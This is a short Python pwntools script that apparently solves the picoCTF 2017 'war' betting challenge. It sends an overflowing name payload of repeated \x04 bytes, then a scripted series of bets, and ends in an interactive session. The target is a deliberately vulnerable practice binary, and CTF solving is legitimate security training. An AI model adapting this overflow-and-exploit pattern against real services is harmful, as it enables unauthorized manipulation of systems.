#!/usr/bin/python
import sys
import time
import argparse
from pwn import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

def wait_for_prompt(r):
  print r.recvuntil("How much would you like to bet?")

#--------------------------------------------------------------------------
if __name__ == "__main__":

  parser = argparse.ArgumentParser(description='Exploit the bins.')
  parser.add_argument('--dbg'   , '-d', action="store_true")
  parser.add_argument('--remote', '-r', action="store_true")
  args = parser.parse_args()

  if args.remote:
    r = remote('shell2017.picoctf.com', 4415)
  else:
    r = process('./war')

  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *main
    """)

  print r.recvuntil("Please enter your name:")
  payload = "\x04\x04"*16
  
  print r.sendline(payload);

  for i in range(0,53):
    wait_for_prompt(r)
    r.sendline('1')
  
  r.sendline('49') 
  r.sendline('98')
  r.sendline('196')
  r.sendline('392')
  # Drop to interactive console
  r.interactive()

